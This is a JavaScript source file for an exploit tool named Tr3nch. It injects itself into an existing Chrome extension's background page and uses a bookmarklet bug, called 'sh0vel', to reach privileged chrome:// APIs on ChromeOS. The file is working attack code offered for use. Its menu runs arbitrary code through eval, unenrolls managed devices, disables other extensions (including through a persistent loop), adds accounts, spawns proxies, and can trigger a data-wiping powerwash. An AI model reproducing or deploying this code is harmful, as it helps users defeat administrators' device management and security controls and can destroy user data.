chrome.runtime.getBackgroundPage((background) => {
	function payload() {
		console.log('Tr3nch injected into current extension.');
		chrome.runtime.onMessage.addListener(function(message) {
			switch(message.cmd) {
				case "runCode":
					/* Since we're the background page, we'll want to be able to run code from the menu, and
					it just so happens Sh0vel requires eval, soooooo...*/
					eval(message.code);
					break;
				case "disable":
					chrome.management.get(chrome.runtime.id, (cur) => {
						chrome.management.setEnabled(message.id, !message.disable);
					});
					break;
				default:
					console.log(`Unrecognized Message: ${message.cmd}`);
					break;
			}
		});
		chrome.browserAction.enable();
		chrome.browserAction.onClicked.addListener(function() {
			function tabPayload() {
				/* asPage is what really ties everything together, with bookmarklets having a bug that
				lets us run code outside of the content script's boundaries. This has been dubbed
				"sh0vel", and we can use it to not only access private chrome APIs, but also Mojo and WEBUI.*/
				const asPage=function(code) {
					let link=window.open('about:blank','_blank');
					link.location.href=`javascript:(function() {chrome=opener.chrome;${code}})();`;
					/* We don't call link.close here as some callbacks need to run before closing, so
					ALL asPage calls need to have window.close be the last thing that runs unless you need the extra tab */
				}
				/* For convenience, we'll want to run code as the extension too, as it may also
				have useful permissions that can be exploited.*/
				const asExt=function(code) {
					chrome.runtime.sendMessage(chrome.runtime.id, {cmd: "runCode", code: code});
				}

				/* Here we load in the base GUI, the options will be filled in later by loadMenuItems. */
				const loadMenuHTML=function() {
					/* I suck at css lmao */
					const menuHTML=`
					<div class="topBar">
						<h1>Tr3nch</h1>
						<a href="https://whelement.github.io" target="_blank">Whelement Homepage</a>
						<a href="https://discord.gg" target="_blank">Whelement Discord</a>
					</div>
					<div id="opt-container"></div>
					<style>
						body{
							margin: 0px;
							padding: 0px;
							font-family: monospace;
							background-color: #2c3e50;
							color: white;
						}
						.topBar{
							width: 100%;
							height: 100px;
							background-color: #2c3e50;
							text-align: center;
						}
						#opt-container{
							background-color: #1d2936;
							text-align: center;
						}
						textarea{
							height: 200px;
							width: 550px;
							color: white;
							padding: 10px;
							background-color: #000;
							border-radius: 20px;
							border: 3px solid white;
						}
						input{
							height: 20px;
							width: 300px;
							color: white;
							padding: 10px;
							background-color: #000;
							border-radius: 20px;
							border: 3px solid white;
						}
						h1{
							font-size: 40px;
						}
						button{
							height: 40px;
							padding: 10px;
							margin: 3px;
							border-radius: 20px;
							border: 3px solid white;
							color: white;
							background-color: #2c3e50;
							font-weight: bold;
						}
						button:hover{
							cursor: pointer;
							background-color: #1d2936;
						}
						a{
							font-weight: bold;
							color: white;
						}
					</style>
					`;
					
					document.head.innerText=""; /* Clear any remaining CSS and JS */
					
					/* Fix some issues with the OOBE */
					document.head=document.createElement('head');
					document.body=document.createElement('body');

					document.title="Tr3nch";
					document.body.innerHTML=menuHTML;
				}

				/* Check what the full extent of our permissions are based off the origin. */
				const checkPerms=function() {
					/* We use window.origin so url parameters can't break the menu */
					if (!window.origin.includes("chrome:")) return null;

					switch(window.origin.replace("chrome://","")) {
						case "oobe":
							return [
								"unenroll",
								"update",
								"webViewProxy",
								"reboot"
							];
							break;
						case "extensions":
							return ["killExtensions"];
							break;
						case "os-settings":
							return [
								"manageNetworks",
								"addAccounts",
								"siteSettings",
								"update",
								"restart",
								"disableExtensions"
							];
							break;
						case "settings":
							return [
								"addAccounts",
								"siteSettings",
								"update",
								"restart",
								"disableExtensions"
							];
							break;
						case "file-manager":
							return [""];
							break
						case "chrome-signin":
							return ["webViewProxy"];
							break;
						case "network":
							return ["manageNetworks"];
							break;
						default:
							/* If a page isn't here, its permissions are not considered useful. */
							return null;
							break;
					}
				}

				/* Get available permissions and make a container filled with menu options, then return it. */
				const loadMenuItems=function() {
					let perms=checkPerms();
					let container=document.createElement('div');

					/*=================================================================
					Permission Independent Options
					Put options that don't need specific page permissions here
					=================================================================*/
					
					let extEvalBox=document.createElement('div');
					/* We can use innerHTML because we inherit the CSP from our extension */
					extEvalBox.innerHTML='<br><h1>Run Code As Background Page</h1><textarea id="extEvalBox"></textarea><br><button id="extEvalButton">Run as Background</button>';
					extEvalBox.querySelector('#extEvalButton').addEventListener('click', async () => {
						asExt(document.querySelector('#extEvalBox').value);
					});
					container.append(extEvalBox);

					let pbEvalBox=document.createElement('div');
					pbEvalBox.innerHTML='<br><h1>Run Code As Sh0vel</h1><textarea id="pbEvalBox"></textarea><br><button id="pbEvalButton">Run as Sh0vel</button>';
					pbEvalBox.querySelector('#pbEvalButton').addEventListener('click', async () => {
						asPage(document.querySelector('#pbEvalBox').value);
					});
					container.append(pbEvalBox);

					let pageEvalBox=document.createElement('div');
					pageEvalBox.innerHTML='<br><h1>Run Code On This Page</h1><textarea id="pageEvalBox"></textarea><br><button id="pageEvalButton">Run as Page</button>';
					pageEvalBox.querySelector('#pageEvalButton').addEventListener('click', async () => {
						eval(document.querySelector('#pageEvalBox').value);
					});
					container.append(pageEvalBox);

					/* =================================================================
					Permission Dependent Options
					Put options that DO need specific page permissions here
					=================================================================*/

					if (perms == null) {
						asExt('alert("The page you\'re attempting to run Tr3nch on is not priveledged. Please run this on a url starting with \'chrome://\'.");');
						return container; /* For unpriveledged pages extension permissions are still accessible, so stop only after loading them in. */
					}

					if (chrome.runtime.getManifest().permissions.includes("management")) {
						let disableBox=document.createElement('div');
						disableBox.innerHTML='<br><h1>Fully Disable/Enable Extensions</h1><label><input id="disableIdBox" placeholder="Extension ID Here"></label><br><button id="disableIdButton">Disable Extension</button><button id="enableIdButton">Enable Extension</button>';
						disableBox.querySelector('#disableIdButton').addEventListener('click', () => {
							chrome.runtime.sendMessage(chrome.runtime.id, {
								cmd: 'disable', 
								id: document.querySelector('#disableIdBox').value,
								disable: true
							});
						});
						disableBox.querySelector('#enableIdButton').addEventListener('click', () => {
							chrome.runtime.sendMessage(chrome.runtime.id, {
								cmd: 'disable', 
								id: document.querySelector('#disableIdBox').value,
								disable: false
							});
						});

						container.append(disableBox);
					}
					if (perms.includes("update")) {
						let updateBox=document.createElement('div');
						updateBox.innerHTML='<br><h1>Attempt OS Update</h1><button id="update">Update System</button>';
						updateBox.querySelector('#update').addEventListener('click', () => {
							asPage("chrome.send('requestUpdate');window.close();");
						});
						container.append(updateBox);
					}
					if (perms.includes("restart")) {
						let restartBox=document.createElement('div');
						restartBox.innerHTML='<br><h1>User Session Management</h1>';

						let restart=document.createElement('button');
						restart.innerText="Restart Chrome";
						restart.addEventListener('click', () => {
							asPage("chrome.send('restart');window.close();");
						});
						restartBox.append(restart);

						let signOut=document.createElement('button');
						signOut.innerText="Sign Out";
						signOut.addEventListener('click', () => {
							asPage("chrome.send('signOutAndRestart');window.close();");
						});
						restartBox.append(signOut);

						let powerwash=document.createElement('button');
						powerwash.innerText="Powerwash";
						powerwash.addEventListener('click', () => {
							if (confirm("Note: THIS WILL DELETE ALL USERDATA! ARE YOU SURE?!")) {
								/* For those curious, false here prevents a tpm firmware update */
								asPage("chrome.send('factoryReset', ['false']);window.close();");
							}
						});
						restartBox.append(powerwash);

						container.append(restartBox);
					}
					if (perms.includes("addAccounts")) {
						let accBox=document.createElement('div');
						accBox.innerHTML='<br><h1>Manage Accounts</h1>';

						let addAccButton=document.createElement('button');
						addAccButton.innerText="Add User Account";
						addAccButton.addEventListener('click', () => {
							asPage("chrome.send('TurnOffSync');window.close();");
							/* window.open has a few problems, lets use tabs.create instead. */
							asExt("chrome.tabs.create({url: 'https://tinyurl.com/addSession'});");
						});
						accBox.append(addAccButton);

						container.append(accBox);
					}
					if (perms.includes("webViewProxy")) {
						let proxyBox=document.createElement('div');
						proxyBox.innerHTML='<br><h1>Webview Proxy Spawner</h1><label><input id="proxyUrlBox"></label><br><button id="proxyUrlButton">Launch Webview</button>';
						proxyBox.querySelector('#proxyUrlButton').addEventListener('click', () => {
							let proxy=window.open(window.origin, '_blank');
							/* We can't use innerHTML cross-page because our extension's CSP only applies to this page. */
							proxy.onload=function() {
								document.head.innerText="";
								
								/* Fix problems with the OOBE */
								document.head=document.createElement('head');
								document.body=document.createElement('body');

								document.body.innerHTML="";
							}
						});

						container.append(proxyBox);
					}
					if (perms.includes("killExtensions")) {
						let killBox=document.createElement('div');
						killBox.innerHTML='<br><h1>Extension LoopKiller</h1><label><input id="killIdBox" placeholder="Extension ID Here"></label><br><button id="killIdButton">LoopKill Extension</button>';
						killBox.querySelector('#killIdButton').addEventListener('click', () => {
							let id=document.querySelector('#killIdBox').value;
							function disable(id) {
								/* Everything here runs on about:blank! */
								document.body.innerHTML="<h1>Do not close this page! It is keeping your extension disabled.</h1>";
								let ret=true;
								console.log(`Disabling extension by ID: ${id}`);
								setInterval(() => {
									ret=!ret;
									chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: ret});
								}, 3000);
							}
							asPage(`${disable.toString()};disable('${id}');`);
						});

						container.append(killBox);
					}
					if (perms.includes("unenroll")) {
						let enrollBox=document.createElement('div');
						enrollBox.innerHTML="<br><h1>Unenrollment</h1>";

						let unenroll=document.createElement('button');
						unenroll.innerText="Unenroll";
						unenroll.addEventListener('click', () => {
							asPage("chrome.send('OauthEnrollClose');"); /* Untested */
						});
						enrollBox.append(unenroll);

						container.append(enrollBox);
					}
					container.append(document.createElement('br'));
					
					return container;
				}

				loadMenuHTML(); /* Load in the base menu */
				let mainContainer=document.querySelector('#opt-container');

				if (mainContainer == null) {
					asExt("alert('loadMenuHTML has not been implemented yet.');");
					return;
				}
				mainContainer.append(loadMenuItems()); /* Create a container for all options and append them */
			} /* As Page */

			console.log("Injecting Tr3nch into current page");
			
			/* I would LOVE to use MV3's function injection capabilities, but because Sh0vel relies entirely on MV2,
			we can't do that, so let's do it my way. */
			chrome.tabs.executeScript(null, {code: `${tabPayload.toString()};tabPayload();`});
			/* If you're wondering why I reiterated tabPayload() at the end, it's because the 
			.toString() method in this case only defines the function in the page, it still needs to be called manually. */
		}); /* On Clicked */
	} /* As Background Page */

	let manifest=chrome.runtime.getManifest();
	if (!manifest.browser_action) {
		alert("Current extension does not have browserAction permissions, cannot continue.");
		return;
	}
	/* The quotations prevent it from accepting 'wasm-unsafe-eval' which won't work */
	if (!manifest.content_security_policy.includes("'unsafe-eval'")) { 
		alert("Current extension does not have permission to use eval, cannot continue.");
		return;
	}
	/* Cool perk of sh0vel: The extension requires eval to work, so we can run code directly
	as the background page to get persistence until the extension restarts */
	if (background.location.href !== location.href) {
		background.eval(`${payload.toString()};payload();`);
	}else{
		payload(); /* If this is already running as the background page then we don't need to use eval. */
	}
});
